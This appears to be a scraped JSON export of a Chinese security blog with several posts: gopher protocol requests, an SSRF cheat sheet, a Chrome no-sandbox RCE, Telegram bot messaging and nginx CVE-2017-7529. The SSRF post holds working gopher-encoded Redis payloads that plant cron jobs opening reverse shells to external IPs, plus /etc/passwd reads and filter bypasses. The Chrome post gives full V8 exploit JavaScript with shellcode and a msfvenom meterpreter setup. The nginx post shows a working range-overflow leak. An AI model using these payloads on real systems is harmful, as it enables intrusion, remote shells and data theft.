20%63%6c%6f%73%65%0d%0a%0d%0a ❯ nc -lvv 70 GET / HTTP/1.1 Host: baidu.com Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Accept-Encoding: gzip, deflate Accept-Language: en-US,en;q=0.9 Cookie: BAIDUID=AEC95A01B732C2DED98755D470DEE40D:FG=1; BDUSS=1RYVDRKODZ2cWczNEpFTWhlVWJJTmlUeUlGdEZsQnZYS0trUlBxa2FDVEVubzVnRVFBQUFBJCQAAAAAAAAAAAEAAABlgi8TcXE3NDE0NzQ1OTYAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAMQRZ2DEEWdgS Connection: close   \n发送POST请求 必须参数`POST`、`Host`、`Content-Type`、`Content-Length`、、\nPOST /v1/pages HTTP/2 Host: content-autofill.googleapis.com X-Goog-Encode-Response-If-Executable: base64 X-Goog-Api-Key: dummytoken X-Client-Data: COrfygE= Sec-Fetch-Site: none Sec-Fetch-Mode: no-cors Sec-Fetch-Dest: empty User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36 Accept-Encoding: gzip, deflate Accept-Language: en-US,en;q=0.9 Connection: close Content-Type: application/x-www-form-urlencoded Content-Length: 9 alt=proto    URL全编码HTTP请求包\n  将URL全编码后的HTTP请求包的字符串附加到`_`后\n  1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20  curl -v gopher://127.0.0.1/_%50%4f%53%54%20%2f%76%31%2f%70%61%67%65%73%20%48%54%54%50%2f%32%0d%0a%48%6f%73%74%3a%20%63%6f%6e%74%65%6e%74%2d%61%75%74%6f%66%69%6c%6c%2e%67%6f%6f%67%6c%65%61%70%69%73%2e%63%6f%6d%0d%0a%58%2d%47%6f%6f%67%2d%45%6e%63%6f%64%65%2d%52%65%73%70%6f%6e%73%65%2d%49%66%2d%45%78%65%63%75%74%61%62%6c%65%3a%20%62%61%73%65%36%34%0d%0a%58%2d%47%6f%6f%67%2d%41%70%69%2d%4b%65%79%3a%20%64%75%6d%6d%79%74%6f%6b%65%6e%0d%0a%58%2d%43%6c%69%65%6e%74%2d%44%61%74%61%3a%20%43%4f%72%66%79%67%45%3d%0d%0a%53%65%63%2d%46%65%74%63%68%2d%53%69%74%65%3a%20%6e%6f%6e%65%0d%0a%53%65%63%2d%46%65%74%63%68%2d%4d%6f%64%65%3a%20%6e%6f%2d%63%6f%72%73%0d%0a%53%65%63%2d%46%65%74%63%68%2d%44%65%73%74%3a%20%65%6d%70%74%79%0d%0a%55%73%65%72%2d%41%67%65%6e%74%3a%20%4d%6f%7a%69%6c%6c%61%2f%35%2e%30%20%28%57%69%6e%64%6f%77%73%20%4e%54%20%31%30%2e%30%3b%20%57%69%6e%36%34%3b%20%78%36%34%29%20%41%70%70%6c%65%57%65%62%4b%69%74%2f%35%33%37%2e%33%36%20%28%4b%48%54%4d%4c%2c%20%6c%69%6b%65%20%47%65%63%6b%6f%29%20%43%68%72%6f%6d%65%2f%38%39%2e%30%2e%34%33%38%39%2e%39%30%20%53%61%66%61%72%69%2f%35%33%37%2e%33%36%0d%0a%41%63%63%65%70%74%2d%45%6e%63%6f%64%69%6e%67%3a%20%67%7a%69%70%2c%20%64%65%66%6c%61%74%65%0d%0a%41%63%63%65%70%74%2d%4c%61%6e%67%75%61%67%65%3a%20%65%6e%2d%55%53%2c%65%6e%3b%71%3d%30%2e%39%0d%0a%43%6f%6e%6e%65%63%74%69%6f%6e%3a%20%63%6c%6f%73%65%0d%0a%43%6f%6e%74%65%6e%74%2d%54%79%70%65%3a%20%61%70%70%6c%69%63%61%74%69%6f%6e%2f%78%2d%77%77%77%2d%66%6f%72%6d%2d%75%72%6c%65%6e%63%6f%64%65%64%0d%0a%43%6f%6e%74%65%6e%74%2d%4c%65%6e%67%74%68%3a%20%39%0d%0a%0d%0a%61%6c%74%3d%70%72%6f%74%6f ❯ nc -lvv 70 POST /v1/pages HTTP/2 Host: content-autofill.googleapis.com X-Goog-Encode-Response-If-Executable: base64 X-Goog-Api-Key: dummytoken X-Client-Data: COrfygE= Sec-Fetch-Site: none Sec-Fetch-Mode: no-cors Sec-Fetch-Dest: empty User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36 Accept-Encoding: gzip, deflate Accept-Language: en-US,en;q=0.9 Connection: close Content-Type: application/x-www-form-urlencoded Content-Length: 9 alt=proto   ","description":"","id":61,"section":"en","tags":null,"title":"Gopher","uri":"http://crkmythical.github.io/en/blog/gopher-md/"},{"content":"编写进度\n   靶机环境 https://github.com/vulhub/vulhub/tree/master/weblogic/ssrf\nhttps://github.com/hongriSec/Web-Security-Attack\nhttps://blog.csdn.net/u012206617/article/details/108941738\nhttps://my.oschina.net/u/4588149/blog/4436524\nhttps://www.anquanke.com/post/id/197431\nhttps://websec.readthedocs.io/zh/latest/vuln/ssrf.html\nhttps://segmentfault.com/a/1190000021960060\nhttps://thorns.gitbooks.io/sec/content/teng_xun_mou_chu_ssrf_lou_6d1e28_fei_chang_hao_de.html\nhttps://my.oschina.net/u/4588149/blog/4436524\n能发起对外请求且URL可控的地方都有可能存在ssrf（协议地址端口内容完全可控）\nhttps://joner11234.github.io/article/9d7d2c7d.html\nhttps://joner11234.github.io/article/9897b513.html\nhttps://github.com/tarunkant/Gopherus\n工具 ：http://xip.io/\nhttp://xip.name\nSSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。\n请求中常用参数share、wap、url、link、src、source、target、u、3g、display、sourceURl、imageURL、domain\n1 2 3 4 5 6 7 8  # dict protocol (操作Redis) curl -vvv \u0026#39;dict://127.0.0.1:6379/info\u0026#39; # file protocol (任意文件读取) curl -vvv \u0026#39;file:///etc/passwd\u0026#39; # gopher protocol (一键反弹Bash) * 注意: 链接使用单引号，避免$变量问题 curl -vvv \u0026#39;gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0d%0a%0a%0a*/1 * * * * bash -i \u0026gt;\u0026amp; /dev/tcp/103.21.140.84/6789 0\u0026gt;\u0026amp;1%0a%0a%0a%0a%0a%0d%0a%0d%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0aquit%0d%0a\u0026#39;   协议使用 （1）file： 在有回显的情况下，利用 file 协议可以读取任意内容\n1  curl -v \u0026#39;http://39.x.x.x:8000/ssrf.php?url=file:///etc/passwd\u0026#39;   （2）dict：泄露安装软件版本信息，查看端口，操作内网redis服务等\n1  curl -v \u0026#39;http://39.x.x.x:8000/ssrf.php?url=dict://127.0.0.1:22/\u0026#39;   （3）gopher：gopher支持发出GET、POST请求：可以先截获get请求包和post请求包，再构造成符合gopher协议的请求。\n反弹shell脚本redis-exp.sh\n1 2 3 4 5  redis-cli -h $1 flushall echo -e \u0026#34;\\n\\n*/1 * * * * bash -i \u0026gt;\u0026amp; /dev/tcp/192.168.43.20/7777 0\u0026gt;\u0026amp;1\\n\\n\u0026#34;|redis-cli -h $1 -x set 1 redis-cli -h $1 config set dir /var/spool/cron/ redis-cli -h $1 config set dbfilename root redis-cli -h $1 save   在本级上上运行socat查看执行的命令\n1 2  socat -v tcp-listen:4444,fork tcp-connect:10.211.55.4:6379 # 10.211.55.4 为目标机 sh redis-exp.sh   socat会输出 redis-exp 执行的内容\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41  *3\\r $3\\r set\\r $1\\r 1\\r $65\\r -e */1 * * * * bash -i \u0026gt;\u0026amp; /dev/tcp/192.168.43.26/7777 0\u0026gt;\u0026amp;1 \\r *4\\r $6\\r config\\r $3\\r set\\r $3\\r dir\\r $16\\r /var/spool/cron/\\r *4\\r $6\\r config\\r $3\\r set\\r $10\\r dbfilename\\r $4\\r root\\r *1\\r $4\\r save\\r *1\\r $4\\r quit\\r ^C% ``````zsh curl -v \u0026#39;http://39.x.x.x:8000/ssrf.php?url=gopher://192.168.1.4:6379/_*1%250d%250a%248%250d%250aflushall%250d%250a%2a3%250d%250a%243%250d%250aset%250d%250a%241%250d%250a1%250d%250a%2464%250d%250a%250d%250a%250a%250a%2a%2f1%20%2a%20%2a%20%2a%20%2a%20bash%20-i%20%3E%26%20%2fdev%2ftcp%2f121.36.67.230%2f5555%200%3E%261%250a%250a%250a%250a%250a%250d%250a%250d%250a%250d%250a%2a4%250d%250a%246%250d%250aconfig%250d%250a%243%250d%250aset%250d%250a%243%250d%250adir%250d%250a%2416%250d%250a%2fvar%2fspool%2fcron%2f%250d%250a%2a4%250d%250a%246%250d%250aconfig%250d%250a%243%250d%250aset%250d%250a%2410%250d%250adbfilename%250d%250a%244%250d%250aroot%250d%250a%2a1%250d%250a%244%250d%250asave%250d%250aquit%250d%250a\u0026#39;   （4）http/s：探测内网主机存活\n1  curl -v \u0026#39;http://39.x.x.x:8000/ssrf.php?url=dict://127.0.0.1\u0026#39;   Bypass  针对Host  1 2 3 4 5 6 7  1. http://www.target.com@10.10.10.10 -\u0026gt;10.10.10.10 2. http://10.10.10.10#www.target.com -\u0026gt;10.10.10.10 3. 10。10。10。10 -\u0026gt; 10.10.10.10 3. xip.io \u0026amp; xip.name 4. tinyurl.com 6. ip编码绕过 7. [DNS Rebinding](https://github.com/Tr3jer/dnsAutoRebinding)   SSRF探测内网Redis服务(burp intruder)   利用http协议对内网进行探测，探测整个内网的存活ip， curl http://www.target.com/ssrf.php?url=http://172.16.x.x\n  利用dict协议获取存活ip的6379端口banner信息 curl http://www.target.com/ssrf.php?url=dict://172.16.55.23:6379/info\n  利用crontab写计划任务\n URL全编码以下payload  1 2 3 4 5 6 7 8  test set 1 \u0026#34;\\n\\n\\n\\n* * * * * root bash -i \u0026gt;\u0026amp; /dev/tcp/vps/port 0\u0026gt;\u0026amp;1\\n\\n\\n\\n\u0026#34; config set dir /var/spool/root config set dbfilename crontab save aaa   使用gopher协议发送payload  1 2 3 4 5 6  curl http://www.target.com/ssrf.php?url=gopher://172.16.55.23:6379/_%74%65%73%74%0d%0a%0d%0a%73%65%74%20%31%20%22%5c%6e%5c%6e%5c%6e%5c%6e%2a%20%2a%20%2a%20%2a%20%2a%20%72%6f%6f%74%20%62%61%73%68%20%2d%69%20%3e%26%20%2f%64%65%76%2f%74%63%70%2f%6c%51%69%70%2f%d1%2c%ef%e3%20%30%3e%26%31%5c%6e%5c%6e%5c%6e%5c%6e%22%0d%0a%63%6f%6e%66%69%67%20%73%65%74%20%64%69%72%20%2f%74%6d%70%0d%0a%63%6f%6e%66%69%67%20%73%65%74%20%64%62%66%69%6c%65%6e%61%6d%65%20%63%72%6f%6e%74%61%62%0d%0a%73%61%76%65%0d%0a%0d%0a%61%61%61 +OK +OK +OK +OK   通过Gopherus生成RESP格式的payload  1 2 3 4 5 6  python gopherus.py --exploit redis Your gopher link is ready to get Reverse Shell: gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2464%0D%0A%0A%0A%2A/1%20%2A%20%2A%20%2A%20%2A%20bash%20-c%20%22sh%20-i%20%3E%26%20/dev/tcp/127.0.0.1/1234%200%3E%261%22%0A%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2416%0D%0A/var/spool/cron/%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%244%0D%0Aroot%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A%0A Before sending request plz do `nc -lvp 1234`     工具\nSSRFmap\nSSRF-Testing\n","description":"","id":62,"section":"en","tags":null,"title":"SSRF","uri":"http://crkmythical.github.io/en/blog/ssrf/"},{"content":"编写进度\n   exp.html sample 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106  \u0026lt;script\u0026gt; function gc() { for (var i = 0; i \u0026lt; 0x80000; ++i) { var a = new ArrayBuffer(); } } // replace the shellcode with cs\u0026#39;payload generate as c format  let shellcode = [ 0xFC, 0x48, 0x83, 0xE4, 0xF0, 0xE8, 0xC0, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xD2, 0x65, 0x48, 0x8B, 0x52, 0x60, 0x48, 0x8B, 0x52, 0x18, 0x48, 0x8B, 0x52, 0x20, 0x48, 0x8B, 0x72, 0x50, 0x48, 0x0F, 0xB7, 0x4A, 0x4A, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0, 0xAC, 0x3C, 0x61, 0x7C, 0x02, 0x2C, 0x20, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1, 0xE2, 0xED, 0x52, 0x41, 0x51, 0x48, 0x8B, 0x52, 0x20, 0x8B, 0x42, 0x3C, 0x48, 0x01, 0xD0, 0x8B, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48, 0x85, 0xC0, 0x74, 0x67, 0x48, 0x01, 0xD0, 0x50, 0x8B, 0x48, 0x18, 0x44, 0x8B, 0x40, 0x20, 0x49, 0x01, 0xD0, 0xE3, 0x56, 0x48, 0xFF, 0xC9, 0x41, 0x8B, 0x34, 0x88, 0x48, 0x01, 0xD6, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0, 0xAC, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1, 0x38, 0xE0, 0x75, 0xF1, 0x4C, 0x03, 0x4C, 0x24, 0x08, 0x45, 0x39, 0xD1, 0x75, 0xD8, 0x58, 0x44, 0x8B, 0x40, 0x24, 0x49, 0x01, 0xD0, 0x66, 0x41, 0x8B, 0x0C, 0x48, 0x44, 0x8B, 0x40, 0x1C, 0x49, 0x01, 0xD0, 0x41, 0x8B, 0x04, 0x88, 0x48, 0x01, 0xD0, 0x41, 0x58, 0x41, 0x58, 0x5E, 0x59, 0x5A, 0x41, 0x58, 0x41, 0x59, 0x41, 0x5A, 0x48, 0x83, 0xEC, 0x20, 0x41, 0x52, 0xFF, 0xE0, 0x58, 0x41, 0x59, 0x5A, 0x48, 0x8B, 0x12, 0xE9, 0x57, 0xFF, 0xFF, 0xFF, 0x5D, 0x48, 0xBA, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x8D, 0x01, 0x01, 0x00, 0x00, 0x41, 0xBA, 0x31, 0x8B, 0x6F, 0x87, 0xFF, 0xD5, 0xBB, 0xF0, 0xB5, 0xA2, 0x56, 0x41, 0xBA, 0xA6, 0x95, 0xBD, 0x9D, 0xFF, 0xD5, 0x48, 0x83, 0xC4, 0x28, 0x3C, 0x06, 0x7C, 0x0A, 0x80, 0xFB, 0xE0, 0x75, 0x05, 0xBB, 0x47, 0x13, 0x72, 0x6F, 0x6A, 0x00, 0x59, 0x41, 0x89, 0xDA, 0xFF, 0xD5, 0x6E, 0x6F, 0x74, 0x65, 0x70, 0x61, 0x64, 0x2E, 0x65, 0x78, 0x65, 0x00 ]; var wasmCode = new Uint8Array([0, 97, 115, 109, 1, 0, 0, 0, 1, 133, 128, 128, 128, 0, 1, 96, 0, 1, 127, 3, 130, 128, 128, 128, 0, 1, 0, 4, 132, 128, 128, 128, 0, 1, 112, 0, 0, 5, 131, 128, 128, 128, 0, 1, 0, 1, 6, 129, 128, 128, 128, 0, 0, 7, 145, 128, 128, 128, 0, 2, 6, 109, 101, 109, 111, 114, 121, 2, 0, 4, 109, 97, 105, 110, 0, 0, 10, 138, 128, 128, 128, 0, 1, 132, 128, 128, 128, 0, 0, 65, 42, 11]); var wasmModule = new WebAssembly.Module(wasmCode); var wasmInstance = new WebAssembly.Instance(wasmModule); var main = wasmInstance.exports.main; var bf = new ArrayBuffer(8); var bfView = new DataView(bf); function fLow(f) { bfView.setFloat64(0, f, true); return (bfView.getUint32(0, true)); } function fHi(f) { bfView.setFloat64(0, f, true); return (bfView.getUint32(4, true)) } function i2f(low, hi) { bfView.setUint32(0, low, true); bfView.setUint32(4, hi, true); return bfView.getFloat64(0, true); } function f2big(f) { bfView.setFloat64(0, f, true); return bfView.getBigUint64(0, true); } function big2f(b) { bfView.setBigUint64(0, b, true); return bfView.getFloat64(0, true); } class LeakArrayBuffer extends ArrayBuffer { constructor(size) { super(size); this.slot = 0xb33f; } } function foo(a) { let x = -1; if (a) x = 0xFFFFFFFF; var arr = new Array(Math.sign(0 - Math.max(0, x, -1))); arr.shift(); let local_arr = Array(2); local_arr[0] = 5.1;//4014666666666666  let buff = new LeakArrayBuffer(0x1000);//byteLength idx=8  arr[0] = 0x1122; return [arr, local_arr, buff]; } for (var i = 0; i \u0026lt; 0x10000; ++i) foo(false); gc(); gc(); [corrput_arr, rwarr, corrupt_buff] = foo(true); corrput_arr[12] = 0x22444; delete corrput_arr; function setbackingStore(hi, low) { rwarr[4] = i2f(fLow(rwarr[4]), hi); rwarr[5] = i2f(low, fHi(rwarr[5])); } function leakObjLow(o) { corrupt_buff.slot = o; return (fLow(rwarr[9]) - 1); } let corrupt_view = new DataView(corrupt_buff); let corrupt_buffer_ptr_low = leakObjLow(corrupt_buff); let idx0Addr = corrupt_buffer_ptr_low - 0x10; let baseAddr = (corrupt_buffer_ptr_low \u0026amp; 0xffff0000) - ((corrupt_buffer_ptr_low \u0026amp; 0xffff0000) % 0x40000) + 0x40000; let delta = baseAddr + 0x1c - idx0Addr; if ((delta % 8) == 0) { let baseIdx = delta / 8; this.base = fLow(rwarr[baseIdx]); } else { let baseIdx = ((delta - (delta % 8)) / 8); this.base = fHi(rwarr[baseIdx]); } let wasmInsAddr = leakObjLow(wasmInstance); setbackingStore(wasmInsAddr, this.base); let code_entry = corrupt_view.getFloat64(13 * 8, true); setbackingStore(fLow(code_entry), fHi(code_entry)); for (let i = 0; i \u0026lt; shellcode.length; i++) { corrupt_view.setUint8(i, shellcode[i]); } main(); \u0026lt;/script\u0026gt;   MSF\n1  msfvenom -a x64 -p windows/x64/meterpreter/reverse_tcp lhost=192.168.43.26 lport=8080 -f csharp \u0026gt; bb.txt   1 2  python -m SimpleHTTPServer 8888 /path/to/chrome.exe -no-sandbox   msf运行\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30  msf6 \u0026gt; handler -H 192.168.43.26 -P 8080 -p windows/x64/meterpreter/reverse_tcp [*] Payload handler running as background job 0. [*] Started reverse TCP handler on 192.168.43.26:8080 msf6 \u0026gt; [*] Sending stage (200262 bytes) to 192.168.43.26 [*] Meterpreter session 1 opened (192.168.43.26:8080 -\u0026gt; 192.168.43.26:54937) at 2021-04-16 08:52:41 +0800 msf6 \u0026gt; msf6 \u0026gt; jobs Jobs ==== Id Name Payload Payload opts -- ---- ------- ------------ 0 Exploit: multi/handler windows/x64/meterpreter/reverse_tcp tcp://192.168.43.26:8080 msf6 \u0026gt; sessions Active sessions =============== Id Name Type Information Connection -- ---- ---- ----------- ---------- 1 meterpreter x64/windows ETHANHUNTER78BC\\ethan @ ETHANHUNTER78BC 192.168.43.26:8080 -\u0026gt; 192.168.43.26:54937 (10.211.55.3) msf6 \u0026gt; sessions -i 1 [*] Starting interaction with 1... meterpreter \u0026gt;   参考：\nCobalt Strike 利用 Chrome 0day 上线 \n","description":"","id":63,"section":"en","tags":null,"title":"Chrome_0day_RCE_no_sandbox","uri":"http://crkmythical.github.io/en/blog/chrome-0day-rce-no-sandbox/"},{"content":"编写进度\n   Telegram（非正式簡稱TG）是跨平台的即時通訊软件\n如何通过电报机器人给自己发消息(类似微信公众号推送消息通知) 1  curl -X POST \u0026#34;https://api.telegram.org/bot\u0026lt;token\u0026gt;/sendMessage\u0026#34; -d \u0026#34;chat_id=\u0026lt;chat-id\u0026gt;5\u0026amp;text=\u0026lt;message\u0026gt;\u0026#34;   所需参数\n   机器人token 类似于 1234567890:AAGRfRacMktFHtM1XSpj477m33RSONKlPWo\n   会话id 类似于 509654615\n   推送内容\n  创建Telegram机器人 获取Token (任意聊天窗口发送@BotFather，并点击此字符串即可)\n     /start\n/newbot\n\u0026lt;bot_name\u0026gt; //机器人名字\n\u0026lt;user_name\u0026gt;_bot //机器人ID 输入完毕后返回此机器人的Token 《1234567890:AAGRfRacMktFHtM1XSpj477m33RSONKlPWo》\nDone! Congratulations on your new bot. You will find it at t.me/Bili_auto_checkIn_bot. You can now add a description, about section and profile picture for your bot, see /help for a list of commands. By the way, when you\u0026rsquo;ve finished creating your cool bot, ping our Bot Support if you want a better username for it. Just make sure the bot is fully operational before you do this.\nUse this token to access the HTTP API: 1234567890:AAGRfRacMktFHtM1XSpj477m33RSONKlPWo Keep your token secure and store it safely, it can be used by anyone to control your bot. For a description of the Bot API, see this page: https://core.telegram.org/bots/api   * [ ] 获取会话id (任意聊天窗口发送@userinfo，并点击此字符串) ```zsh @ethan1 Id: 509654615 First: Ethan Last: Hunter Lang: en  curl测试推送内容到机器人  1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29  curl -X POST \u0026#34;https://api.telegram.org/bot173220123420:AAGRfRacMKAtFHtM1XSpj477mMFRSONKlPWo/sendMessage\u0026#34; -d \u0026#34;chat_id=509654615\u0026amp;text=https://askding.github.io\u0026#34; { \u0026#34;ok\u0026#34;: true, \u0026#34;result\u0026#34;: { \u0026#34;message_id\u0026#34;: 11, \u0026#34;from\u0026#34;: { \u0026#34;id\u0026#34;: 17020603330, \u0026#34;is_bot\u0026#34;: true, \u0026#34;first_name\u0026#34;: \u0026#34;Bili\u0026#34;, \u0026#34;username\u0026#34;: \u0026#34;Bili_checkIn_bot\u0026#34; }, \u0026#34;chat\u0026#34;: { \u0026#34;id\u0026#34;: 5096546232, \u0026#34;first_name\u0026#34;: \u0026#34;Ethan\u0026#34;, \u0026#34;last_name\u0026#34;: \u0026#34;Hunter\u0026#34;, \u0026#34;username\u0026#34;: \u0026#34;et7an\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;private\u0026#34; }, \u0026#34;date\u0026#34;: 1617958429, \u0026#34;text\u0026#34;: \u0026#34;https://askding.github.io\u0026#34;, \u0026#34;entities\u0026#34;: [ { \u0026#34;offset\u0026#34;: 0, \u0026#34;length\u0026#34;: 25, \u0026#34;type\u0026#34;: \u0026#34;url\u0026#34; } ] } }   参考\n如何通过电报机器人给自己或群组发消息\n","description":"","id":64,"section":"en","tags":null,"title":"Telegram","uri":"http://crkmythical.github.io/en/blog/telegram/"},{"content":"编写进度\n   Nginx整数溢出漏洞 CVE-2017-7529 当使用nginx标准模块时，攻击者可以通过发送包含恶意构造 range 域的 header 请求，来获取响应中的缓存文件头部信息。在某些配置中，缓存文件头可能包含后端服务器的IP地址或其它敏感信息，从而导致信息泄露。\n环境搭建参考 CVE-2017-7529\n1 2  docker pull medicean/vulapps:n_nginx_1 docker run -d -p 8000:80 medicean/vulapps:n_nginx_1   影响版本   Nginx version 0.5.6 - 1.13.2\n该漏洞影响所有 0.5.6 - 1.13.2版本内默认配置模块的Nginx只需要开启缓存攻击者即可发送恶意请求进行远程攻击造成信息泄露。\n  修复版本 Nginx version 1.13.3, 1.12.1\n  测试方法  命令行版  1  curl -I http://192.168.43.204:8000/proxy/demo.png -x 127.0.0.1:8080 # 查看文件大小 Content-Length: 16585   curl命令用法 请参考curl-wget\n1    CVE-2017-7259\n测试原理 HTTP Range范围请求-响应包\n1  curl -i http://192.168.43.204:8000/proxy/demo.png -x 127.0.0.1:8080 -r -17208,-9223372036854758600   1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46  GET /proxy/demo.png HTTP/1.1 # HTTP版本必须在1.1及以上版本 Host: 192.168.43.204:8000 Range: bytes=-17208,-9223372036854758600 # 指定Range字段 User-Agent: curl/7.64.1 Accept: */* Connection: close HTTP/1.1 206 Partial Content # 表明服务器正确处理了请求并返回Range指定的数据区间 Server: nginx/1.13.1 Date: Wed, 07 Apr 2021 15:04:48 GMT Content-Type: multipart/byteranges; boundary=00000000000000000025` # 多个数据区间用multipart/byteranges; boundary标识 Connection: close Last-Modified: Mon, 17 Jul 2017 02:19:08 GMT ETag: \u0026#34;40c9-5547a060fdf00\u0026#34; X-Proxy-Cache: HIT --00000000000000000025 Content-Type: image/png # 指定媒体类型 Content-Range: bytes -623-16584/16585 # 标识返回指定文件的部分内容在整个文件中所处的位置 \u0000:Ìm`\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u001elY\u0000\u0000\u0000\u0000âÉm`\u0000\u0000\u0000\u0000ä.åä\u0000\u0000{\u0001v\u0002\u0014\u0026#34;40c9-5547a060fdf00\u0026#34;\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000 KEY: httpGET192.168.43.204/proxy/demo.png HTTP/1.1 200 OK Date: Wed, 07 Apr 2021 15:04:02 GMT Server: Apache/2.4.25 (Debian) Last-Modified: Mon, 17 Jul 2017 02:19:08 GMT ETag: \u0026#34;40c9-5547a060fdf00\u0026#34; Accept-Ranges: bytes # 表示支持服务器支持范围请求 Content-Length: 16585 # 标识返回指定文件的部分内容在整个文件中所处的位置 Content-Type: image/png # 指定媒体类型 Connection: close PNG \u001a \u0000\u0000\u0000 IHDR\u0000\u0000\u0001Ì\u0000\u0000\u0000`\u0008\u0006\u0000\u0000\u0000rB§\u0000\u0000\u000c\u0014iCCPICC Profile\u0000\u0000HW\u0007XSÉ\u0016[R\u0008\t-\u0010\u0001)¡w¤Wé½\u0008H\u0007\u001b!\t\u0010J bG\u0017\u0015\\\u000b*\u0026#34;XÑU\u0010E×\u0002È¢\u0026#34;bg\u0011ìýÊÊºX°¡ò\u0026amp;\u0005t}í{\u0026#39;ßÜùsæ3ÿ;\u0001@Ñ*\u0001Ã/\u0010D\u0007ù2\u0013¤\u0026gt;\u0003yøq\u0002F,¶0Ï\u0026#39;`\u001c@\u0019ëÿ.ïn\u0002DÜ_³\u0012Çú×ñÿ*Ê\u001c® %\u0004Ja.aQ B \u0010(\u0004 \u0008Â\tM](\u0004 B \u0010(\u0004\u0010øÿÆHs\u0026amp;*\u0000\u0000\u0000\u0000IEND®B` --00000000000000000027 Content-Type: image/png # 指定媒体类型 